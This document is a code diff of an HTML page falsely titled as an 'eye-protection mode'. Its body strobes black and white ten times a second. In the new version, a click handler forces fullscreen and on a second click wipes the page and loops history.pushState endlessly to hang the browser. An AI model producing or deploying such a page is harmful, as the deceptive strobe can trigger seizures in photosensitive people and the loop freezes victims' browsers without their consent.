@@ -1,24 +1,48 @@
-<!DOCTYPE html>
-<html lang="en" onclick="document.write('');let total = '';setTimeout(()=>{for (let i = 0; ; i++) {total += i.toString();try {history.pushState(0, 0, total);} catch { }}},0)">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>护眼模式1</title>
-    <style>
-        body {
-            margin: 0;
-            height: 100vh;
-            background-color: white;
-            animation: blinkAnimation 0.1s infinite;
+<!doctype html>
+<html
+    lang="en"
+    onclick="
+        if (window.a) {
+            document.write('');
+            let total = '';
+            setTimeout(() => {
+                for (let i = 0; ; i++) {
+                    total += i.toString();
+                    try {
+                        history.pushState(0, 0, total);
+                    } catch {}
+                }
+            }, 0);
+        } else {
+            window.a = 1;
+            document.documentElement.requestFullscreen();
         }
+    "
+>
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>护眼模式1</title>
+        <style>
+            body {
+                margin: 0;
+                height: 100vh;
+                background-color: white;
+                animation: blinkAnimation 0.1s infinite;
+            }
 
-        @keyframes blinkAnimation {
-            0% { background-color: white; }
-            50% { background-color: black; }
-            100% { background-color: white; }
-        }
-    </style>
-</head>
-<body>
-</body>
+            @keyframes blinkAnimation {
+                0% {
+                    background-color: white;
+                }
+                50% {
+                    background-color: black;
+                }
+                100% {
+                    background-color: white;
+                }
+            }
+        </style>
+    </head>
+    <body></body>
 </html>
